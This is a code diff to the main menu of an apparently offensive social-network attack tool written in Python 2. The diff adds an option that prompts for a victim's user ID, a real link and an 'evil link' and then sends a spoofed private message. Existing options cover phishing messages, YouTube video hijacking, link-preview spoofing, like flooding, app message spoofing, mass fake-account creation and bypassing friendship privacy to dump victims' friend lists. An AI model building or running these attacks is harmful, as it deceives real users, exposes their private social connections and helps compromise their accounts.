@@ -1,4 +1,4 @@
-from mainFunc import sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts 
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts 
 from database import connect,status
 from time import time
 import signal
@@ -54,7 +54,7 @@ def main():
                (int(option) != 15) and (int(option) != 16) and 
                (int(option) != 17) and (int(option) != 18) and
                (int(option) != 19) and (int(option) != 20) and
-               (int(option) != 21)):
+               (int(option) != 21) and (int(option) != 22)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -65,19 +65,20 @@ def main():
             print '6)  Link Preview hack (Simple web version)\n'
             print '7)  Link Preview hack (Youtube version)\n'
             print '8)  Youtube hijack\n'
-            print '9)  Private message phishing/hijacking youtube video\n'
-            print '10) Like flood\n'
-            print '11) Publish a post as an App (App Message Spoof)\n'
-            print '12) Bypass friendship privacy\n'
-            print '13) Bypass friendship privacy with graph support\n'
-            print '14) Analyze an existing graph\n'
-            print '15) Link to disclosed friendships\n'
-            print '16) Print database status\n'
-            print '17) Increase logging level globally\n'
-            print '18) Set global login (Credentials stored in memory - Danger)\n'
-            print '19) Print dead attacks :\'( \n'
-            print '20) Send friend request to disclosed friend list from your account\n'
-            print '21) Close the application\n'
+            print '9)  Private message, Link Preview hack (Simple web version)\n'
+            print '10)  Private message, Link Preview hack (Youtube version)\n'
+            print '11) Like flood\n'
+            print '12) Publish a post as an App (App Message Spoof)\n'
+            print '13) Bypass friendship privacy\n'
+            print '14) Bypass friendship privacy with graph support\n'
+            print '15) Analyze an existing graph\n'
+            print '16) Link to disclosed friendships\n'
+            print '17) Print database status\n'
+            print '18) Increase logging level globally\n'
+            print '19) Set global login (Credentials stored in memory - Danger)\n'
+            print '20) Print dead attacks :\'( \n'
+            print '21) Send friend request to disclosed friend list from your account\n'
+            print '22) Close the application\n'
             
             choice = raw_input('Insert your choice: ')
             
@@ -193,9 +194,28 @@ def main():
                 comment = raw_input('Insert a comment for the post associated to the video: ')
                 hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
                 hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo)
-        
-        
+
         if (int(option) == 9):
+            signal.signal(signal.SIGINT, signal_handler)
+
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                victim = raw_input('Insert the victims user ID: ')
+                realLink = raw_input('Insert the real link: ')
+                title = raw_input('Insert a title for the link: ')
+                subject = raw_input('Insert the subject: ')
+                summary = raw_input('Insert a summary for the link: ')
+                message = raw_input('Insert the body of the message: ')            
+                evilLink = raw_input('Insert the evil link: ')
+                imageLink = raw_input('Insert the image associated to the post: ')
+                privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink)        
+        
+        if (int(option) == 10):
             signal.signal(signal.SIGINT, signal_handler)
 
             if (globalLogin == False):
@@ -217,7 +237,7 @@ def main():
                 privateMessagePhishing(victimId,message,subject,evilLink,videoLink,title,summary,videoID,hijackedVideo)
         
         
-        if (int(option) == 10):
+        if (int(option) == 11):
             signal.signal(signal.SIGINT, signal_handler)
             try:
                 counter = 0
@@ -243,7 +263,7 @@ def main():
                 raw_input('Press enter to continue..')
                     
         
-        if (int(option) == 11):
+        if (int(option) == 12):
             
             if (globalLogin == False):
                 email,password = setMail()
@@ -262,7 +282,7 @@ def main():
                 appMessageSpoof(appId,link,picture,title,domain,description,comment)
             
             
-        if (int(option) == 12):
+        if (int(option) == 13):
             signal.signal(signal.SIGINT, signal_handler)
 
             if (globalLogin == False):
@@ -277,7 +297,7 @@ def main():
                 print 'The information will be stored in dumps\\%s.txt \n' %victim
                 bypassFriendshipPrivacy(victim, transitive)
         
-        if (int(option) == 13):
+        if (int(option) == 14):
             signal.signal(signal.SIGINT, signal_handler)
 
             if (globalLogin == False):
@@ -293,7 +313,7 @@ def main():
                 bypassFriendshipPrivacyPlot(victim, transitive)
 
         
-        if (int(option) == 14):
+        if (int(option) == 15):
             analize = int(raw_input('Analyze an existing one, or a new one? (0|1): '))
             victim = raw_input('Insert the victim username or userId: ')
             if (analize == 1):
@@ -301,19 +321,19 @@ def main():
             else:
                 reAnalyzeGraph(victim)
         
-        if (int(option) == 15):
+        if (int(option) == 16):
             fileName = raw_input('Insert the victim username: ')
             linkFriends(fileName)
             
-        if (int(option) == 16):
+        if (int(option) == 17):
             status()
             raw_input('Press enter to continue: ')
         
-        if (int(option) == 17):
+        if (int(option) == 18):
             print 'This will increase the execution time significantly'
             setGlobalLogginng()
         
-        if (int(option) == 18):
+        if (int(option) == 19):
             
             globalLogin = not globalLogin
             if (globalLogin):
@@ -322,14 +342,14 @@ def main():
                 globalEmail = ''
                 globalPassword = ''
         
-        if (int(option) == 19):
+        if (int(option) == 20):
             print 'Mail bomber through test accounts'
             print 'Test accounts massive creation'
             print 'Blocked Test account login bypass'
             print 'We hope this tool to be useless in the future'
             raw_input('Press enter to continue: ')
         
-        if (int(option) == 20):
+        if (int(option) == 21):
             signal.signal(signal.SIGINT, signal_handler)
             warning = True
             while ( (warning is not '0') and (warning is not '1')):
@@ -349,7 +369,9 @@ def main():
                 if (login(email,password,'real'))!= -1:
                     sendRequestToList(victim)
         
-        if (int(option) == 21):
+
+        
+        if (int(option) == 22):
             connect.close()
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
